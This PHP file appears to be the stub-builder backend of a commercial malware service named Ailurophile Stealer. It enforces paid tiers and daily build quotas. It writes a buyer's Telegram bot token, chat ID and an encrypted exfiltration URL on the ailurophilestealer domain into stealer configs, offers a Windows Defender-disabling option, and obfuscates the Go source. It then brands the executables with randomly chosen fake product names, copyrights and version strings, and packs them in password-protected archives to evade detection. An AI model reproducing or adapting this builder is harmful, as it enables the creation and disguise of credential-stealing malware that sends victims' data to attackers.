<?php
session_start();
include __DIR__ . "/config.php";
require 'vendor/autoload.php';

// Kiểm tra xem user_id có tồn tại trong session hay không
if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Please login']);
    exit();
}

$user_id = $_SESSION['user_id'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
    exit();
}

$username = $user['username'];
$role = $user['role'];

// Kiểm tra giới hạn request dựa trên vai trò
$max_requests = 0;
if ($role == "2") {
    $max_requests = 1;
} elseif ($role == "3") {
    $max_requests = 5;
} elseif ($role == "4") {
    $max_requests = 20;
}


if($role=="1"){
	    echo json_encode(['status' => 'error', 'message' => 'Please buy package or contact @Ailurophilevn for 3 days trial.']);
    exit();
}

//$icon = $_POST['icon'];

$current_date = date('Y-m-d');
$stmt = $pdo->prepare("SELECT request_count FROM request_counts WHERE user_id = ? AND request_date = ?");
$stmt->execute([$user_id, $current_date]);
$request_count = $stmt->fetch(PDO::FETCH_ASSOC);

if ($request_count && $request_count['request_count'] >= $max_requests) {
    echo json_encode(['status' => 'error', 'message' => 'Making stub limit. If you want more please contact @Ailurophilevn']);
    exit();
}

// Nếu chưa có bản ghi, tạo mới
if (!$request_count) {
    $stmt = $pdo->prepare("INSERT INTO request_counts (user_id, request_date, request_count) VALUES (?, ?, 0)");
    $stmt->execute([$user_id, $current_date]);
    $request_count = ['request_count' => 0];
} else {
	 $stmt = $pdo->prepare("UPDATE request_counts SET request_count = request_count + 1 WHERE user_id = ? AND request_date = ?");
    $stmt->execute([$user_id, $current_date]);
}
if($role=="4"){
	$bot_token = $_POST['bot_token'] ?? null;
$chat_id = $_POST['chat_id'] ?? null;
$product_name = $_POST['product_name'] ?? null;

$product_names = ["TechMaster", "DataPilot", "FileGuard", "SecurePro", "UltraDrive", "ProScan", "CloudShield", "InfoSafe", "SoftLayer", "ZipPro"];
$file_descriptions = ["System Protection Software", "Data Encryption Utility", "Backup and Restore Tool", "Advanced File Management", "Network Security Suite", "Automated Update System", "Secure File Storage", "Disk Optimization Tool", "File Compression Utility", "System Diagnostic Tool"];
$product_versions = ["1.0.0.1", "2.0.1.0", "3.5.2.1", "1.1.1.0", "4.0.0.2", "5.1.0.0", "1.2.3.4", "2.3.4.5", "3.4.5.6", "2.0.0.0"];
$copyrights = ["2024 TechMaster Corp. All rights reserved.", "2023 DataPilot Inc.", "2025 FileGuard Technologies.", "2024 SecurePro Software Ltd.", "2023 UltraDrive Solutions.", "2024 InfoSafe Enterprises.", "2024 SoftLayer Systems."];
$legal_trademarkss = ["TechMaster Trademark", "DataPilot Trademark", "FileGuard Trademark", "SecurePro Trademark", "UltraDrive Trademark", "InfoSafe Trademark", "SoftLayer Trademark"];
$original_filenames = ["TechMaster.exe", "DataPilot.exe", "FileGuard.exe", "SecurePro.exe", "UltraDrive.exe", "ProScan.exe", "CloudShield.exe", "InfoSafe.exe", "SoftLayer.exe", "ZipPro.exe"];


$product_name = $_POST['product_name'] ?? null;
if (empty($product_name) || strlen($product_name) > 100) {
    $product_name = $product_names[array_rand($product_names)]; // Random từ danh sách
}

// Kiểm tra $file_description
$file_description = $_POST['file_description'] ?? null;
if (empty($file_description) || strlen($file_description) > 255) {
    $file_description = $file_descriptions[array_rand($file_descriptions)]; // Random từ danh sách
}

// Kiểm tra $file_version (theo format 1.0.0.1)
$file_version = $_POST['file_version'] ?? null;
if (!preg_match('/^\d+\.\d+\.\d+\.\d+$/', $file_version)) {
    $file_version = $product_versions[array_rand($product_versions)]; // Random từ danh sách
}

// Kiểm tra $product_version (theo format 1.0)
$product_version = $_POST['product_version'] ?? null;
if (!preg_match('/^\d+\.\d+$/', $product_version)) {
    $product_version = rand(1, 9) . '.' . rand(0, 9); // Random version đơn giản
}

// Kiểm tra $copyright
$copyright = $_POST['copyright'] ?? null;
if (empty($copyright) || strlen($copyright) > 255) {
    $copyright = $copyrights[array_rand($copyrights)]; // Random từ danh sách
}

// Kiểm tra $legal_trademarks
$legal_trademarks = $_POST['legal_trademarks'] ?? null;
if (empty($legal_trademarks) || strlen($legal_trademarks) > 255) {
    $legal_trademarks = $legal_trademarkss[array_rand($legal_trademarkss)]; // Random từ danh sách
}

// Kiểm tra $original_filename
$original_filename = $_POST['original_filename'] ?? null;
if (empty($original_filename) || strlen($original_filename) > 255) {
    $original_filename = $original_filenames[array_rand($original_filenames)]; // Random từ danh sách
}




if (isset($_POST['disable_wd'])) {
    // Checkbox được chọn
    $Delivery = "1";
} else {
    // Checkbox không được chọn
    $Delivery = "0";
}
$Stub_url = $_POST['url_stub'] ?? null;

if ($product_name === null || $product_name === "") {
    $product_name = "Ailurophile-" . date('YmdHis');
} else {
	if (substr($product_name, -4) !== '.exe') {
    //$product_name .= '.exe';
}
	
	
}

if ($bot_token === null || $bot_token === "" || $chat_id === null || $chat_id === "") {
    $bot_token = "";
    $chat_id = "";
}
	
$key_decrypt = bin2hex(random_bytes(10));
$url1 = base64_encode('https://ailurophilestealer.design/ailurophile?');
$encrypt_data = ailurophile_encrypt($url1,$key_decrypt);
$data = base64_encode($encrypt_data);


$filePath = __DIR__ . '/../ailurophilestub4/v3lib.php';


// Các giá trị cần thay đổi trong $config
$newConfig = [
    'Telegram_token' => $bot_token,
    'Chat_id' => $chat_id,
    'user_id' => $user_id,
	'upload_url' => $data,
	'key_decrypt' => $key_decrypt,
	'Delivery' => $Delivery,
	'Stub_url' => $Stub_url
];	
	
if (isset($_FILES['icon']) && $_FILES['icon']['error'] === UPLOAD_ERR_OK) {
    $icon_info = pathinfo($_FILES['icon']['name']);
    if (strtolower($icon_info['extension']) === 'ico') {
        $icon_destination = __DIR__ . '/../builded/ico.ico';
        if (!move_uploaded_file($_FILES['icon']['tmp_name'], $icon_destination)) {
            echo json_encode(['status' => 'error', 'message' => 'Failed to upload icon.']);
            exit();
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid icon file. Only .ico files are allowed.']);
        exit();
    }
}	
	
	$verstub = $_POST['verstub'] ?? null;
	if($verstub=="v2"){
		
		$srcFolder = 'C:\\xampp\\htdocs\\ailurophilego\\clean';
		$dstFolder = 'C:\\xampp\\htdocs\\ailurophilego\\crypt';

// Kiểm tra nếu thư mục crypt tồn tại thì xóa nó trước khi sao chép
		if (is_dir($dstFolder)) {
		deleteDirectory($dstFolder);
		}

// Sao chép thư mục clean thành crypt
copyDirectory($srcFolder, $dstFolder);
		
		
		$mainGoPath = 'C:\\xampp\\htdocs\\ailurophilego\\crypt\\main.go';
		v2config($mainGoPath, '', $key_decrypt, $bot_token, $chat_id, $data, $Delivery, $Stub_url, $user_id,'');

		
		
		
		
		$nonce = randomNonce();  // Chuỗi nonce 24 ký tự
$key = randomKey();      // Chuỗi key 64 ký tự

// Thay vào lệnh obfus
$rcedit_command = 'C:\Users\Administrator\go\bin\obfus.exe -calls -deadcode -loops -strings -writechanges -srcpath C:\xampp\htdocs\ailurophilego\crypt ' .
    '-stringNonce ' . escapeshellarg($nonce) . ' -stringsKey ' . escapeshellarg($key);
		$bat_file_content = "@echo off\n" . $rcedit_command . "\n";
$bat_file_path = 'C:\xampp\htdocs\ailurophilego\ob.bat';
file_put_contents($bat_file_path, $bat_file_content);
exec($bat_file_path);

putenv('GOROOT=C:\\Program Files\\Go');
putenv('GOPATH=C:\\Users\\Administrator\\go');
putenv('PATH=C:\\Program Files\\Go\\bin;C:\\Users\\Administrator\\go\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Program Files\\nodejs\\;C:\\ProgramData\\chocolatey\\bin;C:\\Program Files\\dotnet\\;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\Scripts\\;C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\;C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\Administrator\\AppData\\Roaming\\npm;C:\\xampp\\php;C:\\Users\\Administrator\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319;C:\\Program Files (x86)\\Resource Hacker;C:\\Resource Tuner Console;C:\\Program Files (x86)\\GDG Software\\ExeOutput for PHP 2024;C:\\Users\\Administrator\\AppData\\Local\\GitHubDesktop\\bin;C:\\lua;C:\\msys64;C:\\msys64\\mingw64\\bin;C:\\Users\\Administrator\\AppData\\Roaming\\luarocks\\bin;C:\\upx;C:\\Program Files\\OpenSSL-Win64\\bin');
chdir('C:\\xampp\\htdocs\\ailurophilego\\crypt');
exec('"C:\\Program Files\\Go\\bin\\go.exe" build -ldflags "-H=windowsgui" -o builded.exe main.go > build_log.txt 2>&1', $output, $return_var);


$source = 'C:\\xampp\\htdocs\\ailurophilego\\crypt\\builded.exe';
$destination = 'C:\\xampp\\htdocs\\builded\\builded.exe';
copy($source, $destination);
	} 
	
	else {

editConfig($filePath, $newConfig);

$bat_file = "C:\\xampp\\htdocs\\ailurophilestub4\\encrypt.bat";
exec($bat_file . " 2>&1", $output, $return_var);
//var_dump($output);

$bat_file = "C:\\xampp\\htdocs\\ailurophilestub4\\build.bat";
exec($bat_file . " 2>&1", $output, $return_var);
	}


$path = __DIR__ . "/../builded/builded.exe";  // Đường dẫn tới file cần nén

$exe_path = 'C:\xampp\htdocs\builded\builded.exe'; // Đường dẫn tới file .exe cần chỉnh sửa
$icon_path = 'C:\xampp\htdocs\builded\ico.ico';
$rcedit_command = '"C:\Program Files\Go\bin\rcedit.exe" "' . $exe_path . '" ' .
    '--set-icon "' . $icon_path . '" ' .
	    '--set-version-string "FileDescription" "' . $file_description . '" ' .
    '--set-version-string "FileVersion" "' . $file_version . '" ' .
    '--set-version-string "ProductName" "' . $product_name . '" ' .
    '--set-version-string "ProductVersion" "' . $product_version . '" ' .
    '--set-version-string "LegalCopyright" "' . $copyright . '" ' .
    '--set-version-string "LegalTrademarks" "' . $legal_trademarks . '" ' .
    '--set-version-string "OriginalFilename" "' . $original_filename . '"';
	
$bat_file_content = "@echo off\n" . $rcedit_command . "\n";
$bat_file_path = 'C:\xampp\htdocs\builded\run_rcedit.bat';
file_put_contents($bat_file_path, $bat_file_content);
exec($bat_file_path);
	
$new = __DIR__ . "/../builded/" . $product_name;  // Đường dẫn tới file đã đổi tên
$password = bin2hex(random_bytes(8));  // Tạo mật khẩu ngẫu nhiên

// Đổi tên file
if (rename($path, $new)) {
    // Tạo tên tệp sử dụng 7ZIP
	$newname = uniqid();
	
    $zipFile = __DIR__ . "/../builded/" . $newname . ".zip";
    
    // Đường dẫn đến 7-Zip (cập nhật đường dẫn nếu cần)
    $zipPath = '"C:\Program Files\7-Zip\7z.exe"';

    // Nén file thành tệp ZIP với mật khẩu

   
	$command = $zipPath . " a -t7z -mhe=on -p" . escapeshellarg($password) . " " . escapeshellarg($zipFile) . " " . escapeshellarg($new);

    exec($command, $output, $return_var);
	


    if ($return_var === 0) { // Kiểm tra nếu lệnh thực thi thành công (return_var === 0)
        // Xóa file .exe sau khi đã nén
        if (unlink($new)) {
            // Thông báo mật khẩu và đường dẫn tải xuống nếu mọi thứ thành công
         //   echo json_encode(['status' => 'success', 'password' => $password, 'message' => 'https://ailurophilestealer.com/download?stub=' . $product_name . ".zip"]);
        } else {
           // echo json_encode(['status' => 'error', 'message' => 'Không thể xóa tệp .exe sau khi nén']);
        }
    } else {
     //   echo json_encode(['status' => 'error', 'message' => 'Không thể tạo tệp ZIP']);
    }
} else {
   // echo json_encode(['status' => 'error', 'message' => 'Không thể đổi tên tệp']);
}


    echo json_encode(['status' => 'success','password'=>$password, 'message' => 'https://ailurophilestealer.com/download?stub=' . $newname . ".zip"]);
	
}

else {

// Thực hiện các xử lý còn lại như kiểm tra đầu vào, cập nhật file JSON, thực hiện tệp .bat
// Kiểm tra và gán giá trị đầu vào
$bot_token = $_POST['bot_token'] ?? null;
$chat_id = $_POST['chat_id'] ?? null;
$product_name = $_POST['product_name'] ?? null;

$product_names = ["TechMaster", "DataPilot", "FileGuard", "SecurePro", "UltraDrive", "ProScan", "CloudShield", "InfoSafe", "SoftLayer", "ZipPro"];
$file_descriptions = ["System Protection Software", "Data Encryption Utility", "Backup and Restore Tool", "Advanced File Management", "Network Security Suite", "Automated Update System", "Secure File Storage", "Disk Optimization Tool", "File Compression Utility", "System Diagnostic Tool"];
$product_versions = ["1.0.0.1", "2.0.1.0", "3.5.2.1", "1.1.1.0", "4.0.0.2", "5.1.0.0", "1.2.3.4", "2.3.4.5", "3.4.5.6", "2.0.0.0"];
$copyrights = ["2024 TechMaster Corp. All rights reserved.", "2023 DataPilot Inc.", "2025 FileGuard Technologies.", "2024 SecurePro Software Ltd.", "2023 UltraDrive Solutions.", "2024 InfoSafe Enterprises.", "2024 SoftLayer Systems."];
$legal_trademarkss = ["TechMaster Trademark", "DataPilot Trademark", "FileGuard Trademark", "SecurePro Trademark", "UltraDrive Trademark", "InfoSafe Trademark", "SoftLayer Trademark"];
$original_filenames = ["TechMaster.exe", "DataPilot.exe", "FileGuard.exe", "SecurePro.exe", "UltraDrive.exe", "ProScan.exe", "CloudShield.exe", "InfoSafe.exe", "SoftLayer.exe", "ZipPro.exe"];


$product_name = $_POST['product_name'] ?? null;
if (empty($product_name) || strlen($product_name) > 100) {
    $product_name = $product_names[array_rand($product_names)]; // Random từ danh sách
}

// Kiểm tra $file_description
$file_description = $_POST['file_description'] ?? null;
if (empty($file_description) || strlen($file_description) > 255) {
    $file_description = $file_descriptions[array_rand($file_descriptions)]; // Random từ danh sách
}

// Kiểm tra $file_version (theo format 1.0.0.1)
$file_version = $_POST['file_version'] ?? null;
if (!preg_match('/^\d+\.\d+\.\d+\.\d+$/', $file_version)) {
    $file_version = $product_versions[array_rand($product_versions)]; // Random từ danh sách
}

// Kiểm tra $product_version (theo format 1.0)
$product_version = $_POST['product_version'] ?? null;
if (!preg_match('/^\d+\.\d+$/', $product_version)) {
    $product_version = rand(1, 9) . '.' . rand(0, 9); // Random version đơn giản
}

// Kiểm tra $copyright
$copyright = $_POST['copyright'] ?? null;
if (empty($copyright) || strlen($copyright) > 255) {
    $copyright = $copyrights[array_rand($copyrights)]; // Random từ danh sách
}

// Kiểm tra $legal_trademarks
$legal_trademarks = $_POST['legal_trademarks'] ?? null;
if (empty($legal_trademarks) || strlen($legal_trademarks) > 255) {
    $legal_trademarks = $legal_trademarkss[array_rand($legal_trademarkss)]; // Random từ danh sách
}

// Kiểm tra $original_filename
$original_filename = $_POST['original_filename'] ?? null;
if (empty($original_filename) || strlen($original_filename) > 255) {
    $original_filename = $original_filenames[array_rand($original_filenames)]; // Random từ danh sách
}

if ($product_name === null || $product_name === "") {
    $product_name = "Ailurophile-" . date('YmdHis');
} else {
	if (substr($product_name, -4) !== '.exe') {
    //$product_name .= '.exe';
}
	
	
}

if ($bot_token === null || $bot_token === "" || $chat_id === null || $chat_id === "") {
    $bot_token = "";
    $chat_id = "";
}


if (isset($_FILES['icon']) && $_FILES['icon']['error'] === UPLOAD_ERR_OK) {
    $icon_info = pathinfo($_FILES['icon']['name']);
    if (strtolower($icon_info['extension']) === 'ico') {
        $icon_destination = __DIR__ . '/../builded/ico.ico';
        if (!move_uploaded_file($_FILES['icon']['tmp_name'], $icon_destination)) {
            echo json_encode(['status' => 'error', 'message' => 'Failed to upload icon.']);
            exit();
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid icon file. Only .ico files are allowed.']);
        exit();
    }
}


$config_file_path = __DIR__ . "/../ailurophilestub/config.json";
$config_stub = json_decode(file_get_contents($config_file_path));

if ($config_stub === null) {
    echo json_encode(['status' => 'error', 'message' => 'Error, please contact @Ailurophilevn']);
    exit();
}



$config_stub->key_decrypt = bin2hex(random_bytes(10));
$url1 = base64_encode('https://ailurophilestealer.com/ailurophile?');
$encrypt_data = ailurophile_encrypt($url1,$config_stub->key_decrypt);
$data = base64_encode($encrypt_data);
$config_stub->Telegram_token = $bot_token;
$config_stub->Chat_id = $chat_id;
$config_stub->user_id = $user_id;
$config_stub->upload_url = $data;


if (file_put_contents($config_file_path, json_encode($config_stub)) === false) {
    echo json_encode(['status' => 'error', 'message' => 'Error, please contact @Ailurophilevn']);
    exit();
}




// Thực hiện tệp .bat
$bat_file = "C:\\xampp\\htdocs\\builded\\build.bat";
exec($bat_file . " 2>&1", $output, $return_var);

$path = __DIR__ . "/../builded/index.exe";  // Đường dẫn tới file cần nén

$exe_path = 'C:\xampp\htdocs\builded\index.exe'; // Đường dẫn tới file .exe cần chỉnh sửa
$icon_path = 'C:\xampp\htdocs\builded\ico.ico';
$rcedit_command = '"C:\Program Files\Go\bin\rcedit.exe" "' . $exe_path . '" ' .
    '--set-icon "' . $icon_path . '" ' .
	    '--set-version-string "FileDescription" "' . $file_description . '" ' .
    '--set-version-string "FileVersion" "' . $file_version . '" ' .
    '--set-version-string "ProductName" "' . $product_name . '" ' .
    '--set-version-string "ProductVersion" "' . $product_version . '" ' .
    '--set-version-string "LegalCopyright" "' . $copyright . '" ' .
    '--set-version-string "LegalTrademarks" "' . $legal_trademarks . '" ' .
    '--set-version-string "OriginalFilename" "' . $original_filename . '"';
	
$bat_file_content = "@echo off\n" . $rcedit_command . "\n";
$bat_file_path = 'C:\xampp\htdocs\builded\run_rcedit.bat';
file_put_contents($bat_file_path, $bat_file_content);
exec($bat_file_path);



$new = __DIR__ . "/../builded/" . $product_name;  // Đường dẫn tới file đã đổi tên
$password = bin2hex(random_bytes(8));  // Tạo mật khẩu ngẫu nhiên

// Đổi tên file
if (rename($path, $new)) {
    // Tạo tên tệp ZIP
    $zipFile = __DIR__ . "/../builded/" . $product_name . ".zip";
    
    // Đường dẫn đến 7-Zip (cập nhật đường dẫn nếu cần)
    $zipPath = '"C:\Program Files\7-Zip\7z.exe"';

    // Nén file thành tệp ZIP với mật khẩu
    $command = $zipPath . " a -tzip -p" . escapeshellarg($password) . " " . escapeshellarg($zipFile) . " " . escapeshellarg($new);
    exec($command, $output, $return_var);

    if ($return_var === 0) { // Kiểm tra nếu lệnh thực thi thành công (return_var === 0)
        // Xóa file .exe sau khi đã nén
        if (unlink($new)) {
            // Thông báo mật khẩu và đường dẫn tải xuống nếu mọi thứ thành công
         //   echo json_encode(['status' => 'success', 'password' => $password, 'message' => 'https://ailurophilestealer.com/download?stub=' . $product_name . ".zip"]);
        } else {
           // echo json_encode(['status' => 'error', 'message' => 'Không thể xóa tệp .exe sau khi nén']);
        }
    } else {
     //   echo json_encode(['status' => 'error', 'message' => 'Không thể tạo tệp ZIP']);
    }
} else {
   // echo json_encode(['status' => 'error', 'message' => 'Không thể đổi tên tệp']);
}


    echo json_encode(['status' => 'success','password'=>$password, 'message' => 'https://ailurophilestealer.com/download?stub='.$product_name.".zip"]);
}


function editConfig($filePath, $newConfig)
{
    // Kiểm tra xem tệp có tồn tại không
    if (!file_exists($filePath)) {

        return;
    }

    // Đọc nội dung tệp thành các dòng
    $fileLines = file($filePath, FILE_IGNORE_NEW_LINES);

    // Kiểm tra nếu dòng thứ 2 chứa $config
    if (isset($fileLines[1]) && strpos($fileLines[1], '$config') !== false) {
        // Lấy dòng $config và trích xuất JSON
        if (preg_match('/\$config\s*=\s*json_decode\(\'(.+?)\'\);/', $fileLines[1], $matches)) {
            // Giải mã JSON hiện tại
            $currentConfig = json_decode($matches[1], true);

            // Cập nhật cấu hình với các giá trị mới
            foreach ($newConfig as $key => $value) {
                if (isset($currentConfig[$key])) {
                    $currentConfig[$key] = $value;
                }
            }

            // Mã hóa JSON mới
            $newConfigJson = json_encode($currentConfig);

            // Thay thế nội dung dòng thứ 2 bằng JSON mới
            $fileLines[1] = str_replace($matches[1], $newConfigJson, $fileLines[1]);

            // Ghi lại nội dung đã chỉnh sửa vào tệp
            if (file_put_contents($filePath, implode("\n", $fileLines)) !== false) {
               // echo "Đã chỉnh sửa tệp thành công: $filePath\n";
            } else {
             //   echo "Lỗi khi ghi vào tệp: $filePath\n";
            }
        } else {
          //  echo "Không tìm thấy JSON trong dòng thứ 2.\n";
        }
    } else {
       // echo "Không tìm thấy $config ở dòng thứ 2.\n";
    }
}


function ailurophile_encrypt($data, $key) {
    $key_length = strlen($key);
    $data_length = strlen($data);
    $encrypted_data = '';

    for ($i = 0; $i < $data_length; $i++) {
        $encrypted_data .= chr((ord($data[$i]) + ord($key[$i % $key_length])) % 256);
    }

    return base64_encode($encrypted_data);
}


function copyDirectory($src, $dst) {
    $dir = opendir($src);
    @mkdir($dst);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($src . '/' . $file) ) {
                copyDirectory($src . '/' . $file, $dst . '/' . $file);
            }
            else {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
}

function deleteDirectory($dirPath) {
    if (!is_dir($dirPath)) {
        return;
    }
    $files = array_diff(scandir($dirPath), ['.', '..']);
    foreach ($files as $file) {
        $fullPath = "$dirPath/$file";
        if (is_dir($fullPath)) {
            deleteDirectory($fullPath);
        } else {
            unlink($fullPath);
        }
    }
    rmdir($dirPath);
}

function v2config($pathgo, $PayloadCrypted_url, $key_decrypt, $Telegram_token, $Chat_id, $upload_url, $Delivery, $Stub_url, $user_id, $welcome) {
    
    $filePath = $pathgo;

    // Đọc nội dung file Go
    $fileContent = file_get_contents($filePath);

    // Tìm vị trí của chuỗi JSON trong file Go
    $startPosition = strpos($fileContent, 'configJSON := `');

    // Kiểm tra nếu tìm thấy vị trí
    if ($startPosition !== false) {
        // Tìm vị trí kết thúc của chuỗi JSON
        $startPosition += strlen('configJSON := `');
        $endPosition = strpos($fileContent, '`', $startPosition);
        
        // Lấy chuỗi JSON
        $jsonString = substr($fileContent, $startPosition, $endPosition - $startPosition);
        
        // Chuyển đổi chuỗi JSON thành mảng PHP
        $configArray = json_decode($jsonString, true);
        
        // Kiểm tra nếu JSON decode thành công
        if (json_last_error() === JSON_ERROR_NONE) {
            // Thực hiện chỉnh sửa giá trị bạn muốn
            $configArray['PayloadCrypted_url'] = $PayloadCrypted_url;
            $configArray['key_decrypt'] = $key_decrypt;
            $configArray['Telegram_token'] = $Telegram_token;
            $configArray['Chat_id'] = $Chat_id;
            $configArray['upload_url'] = $upload_url;
            $configArray['Delivery'] = $Delivery;
            $configArray['Stub_url'] = $Stub_url;
            $configArray['user_id'] = $user_id;
            $configArray['welcome'] = $welcome;

            // Chuyển đổi mảng PHP thành JSON
            $newJsonString = json_encode($configArray, JSON_UNESCAPED_SLASHES);
            
            // Thay thế chuỗi JSON cũ bằng chuỗi JSON mới trong nội dung file Go
            $newFileContent = substr_replace($fileContent, $newJsonString, $startPosition, $endPosition - $startPosition);
            
            // Ghi lại nội dung đã chỉnh sửa vào file Go
            file_put_contents($filePath, $newFileContent);
            
            //echo "File updated successfully!";
        } else {
           // echo "Error decoding JSON: " . json_last_error_msg();
        }
    } else {
      //  echo "Could not find the configJSON line in the file.";
    }
}


function randomNonce($length = 24) {
    return bin2hex(random_bytes($length / 2));
}

// Hàm tạo random key dài 64 ký tự
function randomKey($length = 64) {
    return bin2hex(random_bytes($length / 2));
}

?>
